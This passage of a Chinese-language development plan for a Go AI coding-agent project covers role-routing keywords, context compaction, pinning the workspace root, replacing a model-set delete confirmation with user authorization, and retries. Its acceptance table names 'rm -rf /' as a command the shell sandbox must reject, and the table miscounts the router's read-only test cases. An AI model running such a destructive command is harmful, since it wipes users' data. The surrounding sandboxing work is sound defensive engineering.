**背景（实测 4/8 误判）：** 关键词表把「搜索」「比较」当强信号，且 researcher 命中即夺权：

```
BAD in="实现一个搜索框的搜索功能"        want=coder       got=researcher
BAD in="给我看看代码哪里写错了"           want=coder       got=reviewer
BAD in="帮我对比一下这两个方案并修改代码"      want=coder       got=researcher
BAD in="添加搜索历史的本地缓存"           want=coder       got=researcher
```

前三条都是**编码任务**，却被判给没有写工具的子集角色——任务无法完成，且无任何报错提示。

- [ ] **Step 2.2.1: 写失败测试**

```go
// pkg/orchestrator/router_test.go
func TestRouter_WriteIntentWins(t *testing.T) {
	r := orchestrator.NewRouter()

	// 写入意图必须归 coder（唯一拥有全部工具的角色）
	writeCases := []string{
		"实现一个搜索框的搜索功能",
		"添加搜索历史的本地缓存",
		"帮我对比一下这两个方案并修改代码",
		"给我看看代码哪里写错了",
		"重构 list_files 支持忽略规则",
		"修复 run_shell 的超时问题",
		"实现用户登录接口",
		"写一个单元测试覆盖 evictLoop",
		"优化 session 的锁粒度",
		"把 README 翻译成英文",
	}
	for _, msg := range writeCases {
		if got := r.Route(msg); got != "coder" {
			t.Errorf("Route(%q) = %q, 期望 coder", msg, got)
		}
	}

	// 明确的只读请求仍应正确路由
	readCases := []struct{ msg, want string }{
		{"什么是闭包", "researcher"},
		{"调研一下 bubbletea 的架构", "researcher"},
		{"对比 REST 和 gRPC", "researcher"},
		{"go 和 rust 哪个更适合这个项目", "researcher"},
		{"审查这段代码的安全问题", "reviewer"},
		{"code review 一下这个提交", "reviewer"},
		{"检查一下代码质量", "reviewer"},
	}
	for _, c := range readCases {
		if got := r.Route(c.msg); got != c.want {
			t.Errorf("Route(%q) = %q, 期望 %q", c.msg, got, c.want)
		}
	}
}
```

- [ ] **Step 2.2.2: 实现非对称路由**

```go
package orchestrator

import "strings"

// Router 根据用户消息内容路由到合适的 Agent 类型。
//
// 判定刻意设计为非对称：coder 拥有全部工具，是唯一不会因误判而让任务失败的角色；
// reviewer / researcher 持有工具子集，误判会导致「模型想改代码却没权限」。
// 因此只要检测到写入意图就直接归 coder，哪怕消息里同时出现
// 「对比」「看看」这类本该触发子角色的词。
type Router struct{}

// writeIntentKeywords 表示「需要产出代码改动」的意图，优先级最高。
var writeIntentKeywords = []string{
	// 中文
	"实现", "修改", "重构", "修复", "添加", "新增", "删除", "重命名",
	"优化", "调整", "编写", "创建", "生成", "更新", "改进", "完善",
	"写", "改", "加", "删", "迁移", "重构一下", "补一个", "加上",
	"错", "不对", "报错了", "失败了", "崩了", "修一下", "哪里错",
	// 英文
	"implement", "fix", "refactor", "add", "create", "update", "modify",
	"write", "change", "delete", "remove", "rename", "migrate", "patch",
	"bug", "broken", "error", "crash", "failing", "should be",
}

// reviewIntentKeywords 表示「只读审查」意图。
var reviewIntentKeywords = []string{
	"审查", "review", "代码质量", "code review", "找问题",
	"有什么问题", "有没有问题", "看看代码", "分析代码", "检查代码",
	"评估", "风险点", "能不能合并",
}

// researcherIntentKeywords 表示「需要外部信息或方案对比」意图。
var researcherIntentKeywords = []string{
	"调研", "搜索", "了解", "查找", "research", "什么是",
	"怎么实现", "如何实现", "哪种方案", "选型", "文档",
	"对比", "比较", "优劣", "权衡", "区别", "差异",
	"哪个更", "更适合", "选哪个", "有什么区别",
}

// Route 返回应处理该消息的 Agent 类型名称。
// 返回值："coder" | "reviewer" | "researcher"
func (r *Router) Route(message string) string {
	lower := strings.ToLower(message)

	// 写入意图优先：coder 能完成所有任务，误判代价最低
	if containsAny(lower, writeIntentKeywords) {
		return "coder"
	}
	if containsAny(lower, reviewIntentKeywords) {
		return "reviewer"
	}
	if containsAny(lower, researcherIntentKeywords) {
		return "researcher"
	}
	return "coder"
}

func containsAny(text string, keywords []string) bool {
	for _, kw := range keywords {
		if strings.Contains(text, kw) {
			return true
		}
	}
	return false
}
```

- [ ] **Step 2.2.3: 运行测试**

```bash
go test ./pkg/orchestrator -run TestRouter -v
```

> 验收标准：新旧用例全部通过，且 `researcherKeywords` / `reviewerKeywords` 不再以「强信号」形式出现在 coder 判定路径上。

### Task 2.3: 上下文窗口管理

**Files:**
- Create: `pkg/agent/context.go`
- Create: `pkg/agent/context_test.go`
- Modify: `pkg/agent/base.go:91`（消除 `append` 别名隐患）
- Modify: `pkg/orchestrator/session.go`（摘要字段 + `Compact`）
- Modify: `pkg/orchestrator/orchestrator.go`（`Handle` 中调用）

**背景：** `base.go:91` 每轮把全量历史重发给模型：

```go
allMessages := append(messages, newMessages...)
```

无 token 预算、无截断、无摘要。长会话必然撑爆上下文窗口，成本随轮次线性上升。另：`append` 直接复用 `messages` 底层数组，多轮迭代存在别名污染隐患（当前未爆发但脆弱）。

**设计（见 D2）：** 压缩在 Orchestrator 侧、调 Agent 之前执行一次，摘要写回 Session 复用。

- [ ] **Step 2.3.1: 写失败测试**

```go
// pkg/agent/context_test.go
package agent

import (
	"strings"
	"testing"

	"github.com/sashabaranov/go-openai"
)

func buildMsgs(n int, contentSize int) []openai.ChatCompletionMessage {
	msgs := []openai.ChatCompletionMessage{
		{Role: openai.ChatMessageRoleSystem, Content: "系统提示词"},
	}
	for i := 0; i < n; i++ {
		body := strings.Repeat("x", contentSize)
		msgs = append(msgs,
			openai.ChatCompletionMessage{Role: openai.ChatMessageRoleUser, Content: body},
			openai.ChatCompletionMessage{Role: openai.ChatMessageRoleAssistant, Content: body},
		)
	}
	return msgs
}

func TestEstimateTokens(t *testing.T) {
	// ASCII 约 4 字符/token
	ascii := EstimateTokens("abcdefghijklmnopqrstuvwxyz") // 26 字符
	if ascii < 4 || ascii > 10 {
		t.Errorf("ASCII 估算 = %d, 期望落在 4..10", ascii)
	}

	// CJK 约 1 字符/token
	cjk := EstimateTokens(strings.Repeat("中", 100))
	if cjk < 70 || cjk > 130 {
		t.Errorf("CJK 估算 = %d, 期望落在 70..130", cjk)
	}

	// 混合文本不应返回 0
	if EstimateTokens("中文 mixed 内容 123") <= 0 {
		t.Error("混合文本估算应大于 0")
	}

	// 空串
	if got := EstimateTokens(""); got != 0 {
		t.Errorf("空串估算 = %d, 期望 0", got)
	}
}

func TestEstimateMessagesTokens(t *testing.T) {
	msgs := buildMsgs(10, 500)
	if got := EstimateMessagesTokens(msgs); got <= 0 {
		t.Errorf("消息总 token 估算应大于 0, 得到 %d", got)
	}
	// 单条更大，估算应随之增长
	bigger := buildMsgs(20, 500)
	if EstimateMessagesTokens(bigger) <= EstimateMessagesTokens(msgs) {
		t.Error("消息更多时估算应更大")
	}
}

func TestSplitMessagesForCompaction(t *testing.T) {
	msgs := buildMsgs(6, 100) // 1 system + 12 条

	// keep=4：应保留 system + 最近 4 条，被压缩 8 条
	kept, dropped := splitMessagesForCompaction(msgs, 4)
	if len(kept) != 1+4 {
		t.Errorf("保留数量 = %d, 期望 %d", len(kept), 1+4)
	}
	if kept[0].Role != openai.ChatMessageRoleSystem {
		t.Error("system 消息必须始终保留在头部")
	}
	if len(dropped) != 8 {
		t.Errorf("待压缩数量 = %d, 期望 8", len(dropped))
	}
	// 保留的必须是尾部最近的
	last := msgs[len(msgs)-1].Content
	if kept[len(kept)-1].Content != last {
		t.Error("保留的应是最近的消息")
	}

	// keep 足够大时无需压缩
	kept2, dropped2 := splitMessagesForCompaction(msgs, 100)
	if len(dropped2) != 0 {
		t.Errorf("keep 足够大时不应有待压缩消息, 得到 %d", len(dropped2))
	}
	if len(kept2) != len(msgs) {
		t.Errorf("keep 足够大时应原样保留, 得到 %d 条", len(kept2))
	}

	// keep<=0 时只保留 system
	kept3, _ := splitMessagesForCompaction(msgs, 0)
	if len(kept3) != 1 {
		t.Errorf("keep=0 时只应保留 system, 得到 %d", len(kept3))
	}
}
```

- [ ] **Step 2.3.2: 实现 `context.go`**

```go
package agent

import (
	"strings"
	"unicode"

	"github.com/sashabaranov/go-openai"
)

const (
	// DefaultContextTokenBudget 默认上下文预算（token）。
	// 保守取值：多数模型窗口 128k，但需为响应预留空间，故按 96k 规划。
	DefaultContextTokenBudget = 96_000

	// DefaultKeepRecentTurns 压缩时保留的最近消息条数。
	DefaultKeepRecentTurns = 12

	// MaxSummaryChars 摘要最大字符数。
	MaxSummaryChars = 800
)

// EstimateTokens 粗略估算 token 数。
// 英文约 4 字符/token，CJK 约 1 字符/token。不追求精确，只用于判断是否逼近上限。
func EstimateTokens(s string) int {
	if s == "" {
		return 0
	}
	var ascii, cjk int
	for _, r := range s {
		if unicode.Is(unicode.Han, r) || unicode.Is(unicode.Hiragana, r) ||
			unicode.Is(unicode.Katakana, r) || unicode.Is(unicode.Hangul, r) {
			cjk++
		} else {
			ascii++
		}
	}
	tokens := cjk + ascii/4
	if tokens < 1 && len(s) > 0 {
		return 1
	}
	return tokens
}

// EstimateMessagesTokens 估算整条消息列表的 token 总量，
// 每个消息额外计入固定的格式开销（role / 分隔符）。
func EstimateMessagesTokens(msgs []openai.ChatCompletionMessage) int {
	total := 0
	for _, m := range msgs {
		total += EstimateTokens(m.Content) + 4 // 每条消息的固定开销
		total += EstimateTokens(m.Name) + EstimateTokens(m.Role)
	}
	return total
}

// splitMessagesForCompaction 把消息切分为「保留」与「待压缩」两部分。
// system 消息始终保留在头部；保留区取尾部最近 keep 条。
func splitMessagesForCompaction(msgs []openai.ChatCompletionMessage, keep int) (kept, dropped []openai.ChatCompletionMessage) {
	var system []openai.ChatCompletionMessage
	rest := msgs

	// 提取开头的 system 消息（可能有 0 或多条）
	for len(rest) > 0 && rest[0].Role == openai.ChatMessageRoleSystem {
		system = append(system, rest[0])
		rest = rest[1:]
	}

	if keep < 0 {
		keep = 0
	}
	if keep >= len(rest) {
		// 无需压缩
		return append(system, rest...), nil
	}

	kept = append(kept, system...)
	kept = append(kept, rest[len(rest)-keep:]...)
	dropped = rest[:len(rest)-keep]
	return kept, dropped
}

// NeedsCompaction 判断消息是否超出预算。
func NeedsCompaction(msgs []openai.ChatCompletionMessage, budget int) bool {
	if budget <= 0 {
		budget = DefaultContextTokenBudget
	}
	return EstimateMessagesTokens(msgs) > budget
}

// BuildCompactionSummaryPrompt 构造摘要提示词，要求模型输出结构化摘要。
func BuildCompactionSummaryPrompt(dropped []openai.ChatCompletionMessage) string {
	var b strings.Builder
	b.WriteString("请把以下对话历史压缩成不超过 200 字的摘要，保留关键决策、已修改的文件、遗留问题和下一步计划。\n")
	b.WriteString("只输出摘要正文，不要加标题或解释。\n\n")
	for _, m := range dropped {
		content := m.Content
		if len(content) > 500 {
			content = content[:500] + "…"
		}
		b.WriteString("[")
		b.WriteString(m.Role)
		b.WriteString("] ")
		b.WriteString(content)
		b.WriteString("\n")
	}
	return b.String()
}

// TruncateSummary 将摘要截断到 MaxSummaryChars。
func TruncateSummary(s string) string {
	s = strings.TrimSpace(s)
	runes := []rune(s)
	if len(runes) <= MaxSummaryChars {
		return s
	}
	return string(runes[:MaxSummaryChars]) + "…"
}
```

- [ ] **Step 2.3.3: 消除 `base.go` 的 `append` 别名隐患**

```go
		// 复制后再追加，避免复用 messages 的底层数组导致跨轮污染
		allMessages := make([]openai.ChatCompletionMessage, 0, len(messages)+len(newMessages))
		allMessages = append(allMessages, messages...)
		allMessages = append(allMessages, newMessages...)
```

- [ ] **Step 2.3.4: Session 增加摘要与 `Compact`**

`pkg/orchestrator/session.go`：

```go
type Session struct {
	// ...既有字段
	summary string // 历史摘要（压缩后生成，跨轮复用）
}
```

```go
// Summary 返回历史摘要。
func (s *Session) Summary() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.summary
}

// SetSummary 设置历史摘要。
func (s *Session) SetSummary(summary string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.summary = summary
}

// CompactMessages 返回可能需要压缩的旧消息与保留消息。
// 摘要由调用方生成（需要 LLM 调用），这里只做切分。
func (s *Session) CompactMessages(keep int) (kept, dropped []openai.ChatCompletionMessage) {
	return agent.SplitMessagesForCompaction(s.Messages(), keep)
}
```

> 为避免 `orchestrator → agent` 的导入循环，`SplitMessagesForCompaction` 需导出，或把切分逻辑放在 `orchestrator` 内。推荐：把 `splitMessagesForCompaction` 导出为 `agent.SplitMessagesForCompaction`，`orchestrator` 已依赖 `agent`，无循环。

- [ ] **Step 2.3.5: Orchestrator 在 `Handle` 中触发压缩**

```go
// contextBudget 默认上下文预算，可用 LM_CONTEXT_BUDGET 覆盖。
func contextBudget() int {
	if v := os.Getenv("LM_CONTEXT_BUDGET"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			return n
		}
	}
	return agent.DefaultContextTokenBudget
}

// maybeCompact 在调用 Agent 前压缩过长的历史。
// 摘要写回 Session 复用，避免每轮重新摘要。
func (o *Orchestrator) maybeCompact(ctx context.Context, session *Session, p provider.Provider, model string) {
	msgs := session.Messages()
	if !agent.NeedsCompaction(msgs, contextBudget()) {
		return
	}

	kept, dropped := agent.SplitMessagesForCompaction(msgs, agent.DefaultKeepRecentTurns)
	if len(dropped) == 0 {
		return
	}

	// 已有摘要则与本次待压缩内容合并输入
	summaryPrompt := agent.BuildCompactionSummaryPrompt(dropped)
	if prev := session.Summary(); prev != "" {
		summaryPrompt = "已有历史摘要：\n" + prev + "\n\n" + summaryPrompt
	}

	req := openai.ChatCompletionRequest{
		Model:    model,
		Messages: []openai.ChatCompletionMessage{{Role: openai.ChatMessageRoleSystem, Content: summaryPrompt}},
	}
	resp, err := p.Chat(ctx, req)
	if err != nil || len(resp.Choices) == 0 {
		// 压缩失败不应阻塞主流程，退回不压缩
		return
	}

	summary := agent.TruncateSummary(resp.Choices[0].Message.Content)
	session.SetSummary(summary)

	// 重写为：system(+摘要) + 保留的最近消息
	rebuilt := kept
	if len(summary) > 0 {
		summaryMsg := openai.ChatCompletionMessage{
			Role:    openai.ChatMessageRoleSystem,
			Content: "【历史对话摘要】\n" + summary,
		}
		rebuilt = append([]openai.ChatCompletionMessage{kept[0], summaryMsg}, kept[1:]...)
	}
	session.ReplaceMessages(rebuilt)
	ui.PrintDim("  已压缩历史上下文（%d 条 → %d 条）", len(msgs), len(rebuilt))
}
```

`Handle` 中在 `factory(agentType)` 之后、`AppendUserMessage` 之前插入调用（`factory` 已能取到 agent，但需要 provider，故从 `Handle` 的 `factory` 参数扩展或复用已创建 agent 的 provider）。最简做法：给 `Orchestrator` 加 `provider`/`model` 字段，由 `New` 注入。

`Session` 需补 `ReplaceMessages`：

```go
// ReplaceMessages 整体替换消息历史（压缩后调用）。
func (s *Session) ReplaceMessages(msgs []openai.ChatCompletionMessage) {
	s.mu.Lock()
	defer s.mu.Unlock()
	cp := make([]openai.ChatCompletionMessage, len(msgs))
	copy(cp, msgs)
	s.messages = cp
}
```

- [ ] **Step 2.3.6: 运行测试**

```bash
go test ./pkg/agent -run "TestEstimate|TestSplitMessages" -v
go test ./... && go test -race ./...
```

---

## Phase 3：P2（工程健康度）

### Task 3.1: 固定工作区根目录

**Files:**
- Modify: `pkg/tools/workspace.go:10-23`
- Modify: `cmd/agent/main.go`（启动时注入）

**背景（实测复现）：** `workspaceRoot()` 每次调用都取 `os.Getwd()`，实测 `chdir` 到 `C:/Users/Eric` 后「工作区」变为用户主目录。子进程工作目录变化、或任何 `Chdir` 都会静默移动安全边界。

- [ ] **Step 3.1.1: 改为启动时固定 + 显式注入**

```go
package tools

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
)

var (
	rootOnce   sync.Once
	fixedRoot  string
	rootErr    error
)

// SetWorkspaceRoot 显式固定工作区根目录。
// 应在进程启动时调用一次；不调用时退化为首次调用时的 os.Getwd()。
func SetWorkspaceRoot(root string) error {
	abs, err := filepath.Abs(root)
	if err != nil {
		return fmt.Errorf("解析工作区路径失败: %w", err)
	}
	resolved, err := filepath.EvalSymlinks(abs)
	if err == nil {
		abs = resolved
	}
	fixedRoot = filepath.Clean(abs)
	return nil
}

// workspaceRoot 返回固定的工作区根目录。
// 固定后不再随进程 CWD 变化，避免安全边界漂移。
func workspaceRoot() (string, error) {
	rootOnce.Do(func() {
		if fixedRoot != "" {
			return
		}
		cwd, err := os.Getwd()
		if err != nil {
			rootErr = fmt.Errorf("获取工作区失败: %w", err)
			return
		}
		resolved, err := filepath.EvalSymlinks(cwd)
		if err == nil {
			cwd = resolved
		}
		fixedRoot = filepath.Clean(cwd)
	})
	if rootErr != nil {
		return "", rootErr
	}
	return fixedRoot, nil
}
```

- [ ] **Step 3.1.2: 在 `main.go` 启动时注入**

`runWorker` 中 `loadDotEnv(".env")` 之后：

```go
	// 固定工作区根目录，避免边界随 CWD 漂移
	if err := tools.SetWorkspaceRoot("."); err != nil {
		return fmt.Errorf("设置工作区根目录失败: %w", err)
	}
```

- [ ] **Step 3.1.3: 写测试并验证**

```go
// pkg/tools/workspace_test.go 追加
func TestWorkspaceRoot_StableAcrossChdir(t *testing.T) {
	orig, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	defer os.Chdir(orig)

	if err := SetWorkspaceRoot(orig); err != nil {
		t.Fatal(err)
	}
	first, err := workspaceRoot()
	if err != nil {
		t.Fatal(err)
	}

	// 切换 CWD 后根目录不应改变
	tmp := t.TempDir()
	if err := os.Chdir(tmp); err != nil {
		t.Skipf("无法切换 CWD: %v", err)
	}
	second, err := workspaceRoot()
	if err != nil {
		t.Fatal(err)
	}
	if first != second {
		t.Errorf("工作区根目录随 CWD 漂移: %q -> %q", first, second)
	}
}
```

```bash
go test ./pkg/tools -run TestWorkspaceRoot -v
```

### Task 3.2: `delete_file` 的 confirm 改为真实闸门

**Files:**
- Modify: `pkg/tools/file_ops.go:81-144`

**背景：** `DeleteFileArguments.Confirm` 由**模型自己**填写，属于「模型自我授权」——模型只要把 `confirm` 置为 `true` 就能删除任意工作区内文件，不构成有效闸门。

- [ ] **Step 3.2.1: 改为需用户显式授权**

- [ ] **Step 3.2.2: 增加 `LM_UNSAFE_DELETE=1` 开关**（供自动化场景使用，默认关闭）

- [ ] **Step 3.2.3: 写测试：未授权时拒绝删除**

```bash
go test ./pkg/tools -run TestDeleteFile -v
```

### Task 3.3: 补 LLM 重试与退避

**Files:**
- Modify: `pkg/provider/openai.go`

**背景：** 全仓无任何 retry / backoff。`provider` 覆盖率 80%，是测试最充分却在健壮性上最薄的一层。429 / 5xx / 网络抖动直接失败。

- [ ] **Step 3.3.1: `Chat` 与 `ChatStream` 加重试**

对 429、5xx、网络错误做指数退避重试（3 次，1s/2s/4s），4xx 参数错误不重试。保留 `context` 取消支持。

- [ ] **Step 3.3.2: 写测试**（用 `httptest` 模拟 429 → 200）

```bash
go test ./pkg/provider -run TestRetry -v
```

### Task 3.4: 补齐测试薄弱的层

**背景：** 覆盖率与风险倒挂——`provider` 80%、`orchestrator` 73%，但 `cmd/agent` 12.9%、`ui` 11.4%、`channel/cli` 9.5%。而 docs 中已排期的 bubbletea TUI 迁移（`2026-06-02-bubbletea-tui-migration.md`）正是要重写这块**几乎无测试**的代码。

- [ ] **Step 3.4.1: `pkg/ui` 与 `pkg/channel/cli` 补基础测试**

目标：`pkg/ui` 从 11.4% → 40%，`pkg/channel/cli` 从 9.5% → 50%。优先覆盖 `esc_monitor`（含 Windows/Unix 分支）、`format`、`cli.Start` 的 ctx 取消路径。

- [ ] **Step 3.4.2: 在 CI 中固化质量门禁**

```bash
gofmt -l ./cmd ./pkg        # 必须无输出
go vet ./...
go test -race -cover ./...
```

> 建议在引入 TUI 迁移**之前**完成本任务，否则会在无测试覆盖的基础上重写 UI 层。

---

## 验收标准

| 项 | 验收方式 |
|----|---------|
| shell 沙箱 | `go test ./pkg/tools -run TestCheckShellCommand` 通过；`rm -rf /` 被拒，`go test ./...` 放行 |
| tool_call 组装 | `TestConsumeStreamToolCallAssembly` 4 个子用例全过，含缺 index 场景 |
| 错误统计 | `TestExecuteToolCallPropagatesError` 通过；失败工具使 UI 摘要显示失败数 |
| 数据竞争 | `go test -race ./...` 无 DATA RACE；`Orchestrator.Close()` 可重复调用且不阻塞 |
| 路由 | `TestRouter_WriteIntentWins` 中 10 条写入请求全部归 coder，6 条只读请求正确分类 |
| 上下文 | `TestEstimateTokens` / `TestSplitMessagesForCompaction` 通过；长会话不再无限增长 |
| 工作区 | `TestWorkspaceRoot_StableAcrossChdir` 通过 |
| 工程卫生 | `gofmt -l` 无输出；`go vet` 无告警；全量测试通过 |

## 建议执行顺序

Phase 0（卫生，独立提交）→ Phase 1（P0，尽快合入）→ Phase 2.1/2.2（竞争与路由，用户可感知）→ Phase 3.1 → Phase 2.3（上下文，工作量最大）→ Phase 3.2-3.4。

其中 **Task 1.1 + 1.2 + 1.3 可在一个 PR 内完成**，它们改动集中在 `helpers.go` 与 `file.go`，且都是「静默出错」类缺陷，收益最高。
